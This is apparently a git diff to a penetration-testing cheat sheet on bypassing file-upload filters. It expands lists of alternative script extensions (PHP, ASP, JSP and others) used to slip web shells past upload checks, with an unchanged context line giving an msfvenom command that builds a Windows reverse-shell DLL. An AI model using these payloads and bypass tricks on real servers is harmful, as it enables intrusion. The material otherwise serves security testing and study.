@@ -79,16 +79,27 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > shell.dll
 
 #### Rename the extension 
 ```
-PHP: phtml, .php, .php3, .php4, .php5, and .inc
+• PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
 
-ASP: asp, .aspx
+• PHP8: .php, .php4, .php5, .phtml, .module, .inc, .hphp, .ctp
 
-PERL: .pl, .pm, .cgi, .lib
+• ASP: asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
 
-JSP: .jsp, .jspx, .jsw, .jsv, and .jspf
+• PERL: .pl, .pm, .cgi, .lib
 
-Coldfusion: .cfm, .cfml, .cfc, .dbm
+• JSP: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
+
+• Coldfusion: .cfm, .cfml, .cfc, .dbm
+
+• Flash: .swf
+
+• Erlang Yaws Web Server: .yaws
 ```
+
+
+
+Erlang Yaws Web Server: .yaws
+
 
 #### Magic number
 
